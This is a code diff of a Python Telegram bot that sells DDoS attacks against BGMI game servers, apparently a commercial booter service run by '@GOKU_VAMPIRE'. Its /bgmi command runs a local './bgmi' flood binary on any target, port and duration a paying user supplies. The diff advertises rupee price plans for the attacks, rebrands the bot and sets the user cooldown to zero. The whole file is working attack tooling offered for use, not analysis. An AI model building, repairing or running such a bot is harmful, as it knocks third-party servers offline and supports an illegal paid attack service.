@@ -1,5 +1,3 @@
-#!/usr/bin/python3
-
 import telebot
 import subprocess
 import requests
@@ -28,20 +26,6 @@ def read_users():
         return []
 
 # Function to read free user IDs and their credits from the file
-def read_free_users():
-    try:
-        with open(FREE_USER_FILE, "r") as file:
-            lines = file.read().splitlines()
-            for line in lines:
-                if line.strip():  # Check if line is not empty
-                    user_info = line.split()
-                    if len(user_info) == 2:
-                        user_id, credits = user_info
-                        free_user_credits[user_id] = int(credits)
-                    else:
-                        print(f"Ignoring invalid line in free user file: {line}")
-    except FileNotFoundError:
-        pass
 
 
 # List to store allowed user IDs
@@ -207,7 +191,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP-UDP-BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -223,8 +207,8 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /bgmi Command Again."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
+                response = "You Are On Cooldown ❌. Please Wait 3min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -238,7 +222,7 @@ def handle_bgmi(message):
             if time > 241:
                 response = "Error: Time interval must be less than 240."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, 'bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 200"
@@ -247,7 +231,8 @@ def handle_bgmi(message):
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = "❌ You Are Not Authorized To Use This Command ❌."
+        response = """❌ You Are Not Authorized To Use This Command ❌.
+                      🛒 Please Buy From @GOKU_VAMPIRE"""
 
     bot.reply_to(message, response)
 
@@ -277,16 +262,16 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers. 
-💥 /rules : Please Check Before Use !!.
-💥 /mylogs : To Check Your Recents Attacks.
-💥 /plan : Checkout Our Botnet Rates.
+🚀 /bgmi : Method For Bgmi Servers. 
+🚀 /rules : Please Check Before Use !!.
+🚀 /mylogs : To Check Your Recents Attacks.
+🚀 /plan : Checkout Our Botnet Rates.
 
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @GOKU_VAMPIRE
-Official Channel :- https://t.me/+DoD-CZdAXARkOTZl
+🚀 Buy From :- @GOKU_VAMPIRE
+🚀 Official Channel :- https://t.me/+DoD-CZdAXARkOTZl
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -301,9 +286,9 @@ Official Channel :- https://t.me/+DoD-CZdAXARkOTZl
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
-🤖Try To Run This Command : /help 
-✅Join :- '/t.me/speedel_ddos'
+    response = f'''👋🏻Welcome to The Bot, @GOKU_VAMPIRE
+                    🤖Feel Free to Explore. 
+                    ✅Join :- https://t.me/+DoD-CZdAXARkOTZl'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -311,27 +296,21 @@ def welcome_rules(message):
     user_name = message.from_user.first_name
     response = f'''{user_name} Please Follow These Rules ⚠️:
 
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
-3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
+1. Dont Run Too Many Attacks !! Cause A Ban From Bot!'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
+    response = f'''{user_name}, Our Bgmi Ddos Plans:
 
-Vip 🌟 :
--> Attack Time : 240 (S)
-> After Attack Limit : 5 Min
--> Concurrents Attack : 3
 
-Pr-ice List💸 :
-High power. Ddos
-1 DAY DDOS Rs 180
-3 DAY DDOS Rs 450
-7 DAY DDOS Rs 750
-30 DAY DDOS Rs 1800
+𝗕𝗚𝗠𝗜 𝗗𝗗𝗢𝗦 𝗛𝗔𝗖𝗞 𝗣𝗟𝗔𝗡𝗦
+1 𝗛𝗢𝗨𝗥 :- 60𝗥𝗦 [ 240𝘀𝗲𝗰 ]
+1 𝗱𝗮𝘆 = 180𝗿𝘀 [ 240𝘀𝗲𝗰 ] 
+2 𝗱𝗮𝘆 = 280𝗿𝘀 [ 240𝘀𝗲𝗰 ]
+3 𝗱𝗮𝘆 = 370𝗿𝘀 [ 240𝘀𝗲𝗰 ]
+7 𝗱𝗮𝘆 = 800𝗿𝘀 [ 240𝘀𝗲𝗰 ]
 '''
     bot.reply_to(message, response)
 
@@ -342,7 +321,7 @@ def welcome_plan(message):
 
 💥 /add <userId> : Add a User.
 💥 /remove <userid> Remove a User.
-💥 /allusers : Authorised Users Lists.
+💥 /allusers : Authorized Users Lists.
 💥 /logs : All Users Logs.
 💥 /broadcast : Broadcast a Message.
 💥 /clearlogs : Clear The Logs File.
@@ -375,4 +354,12 @@ def broadcast_message(message):
 
 
 
-bot.polling()
+if __name__ == "__main__":
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except requests.exceptions.ReadTimeout:
+            print("Request timed out. Trying again...")
+        except Exception as e:
+            print(f"An unexpected error occurred: {e}")
+            time.sleep(1)  # wait for 1 second before restarting bot polling to avoid flooding
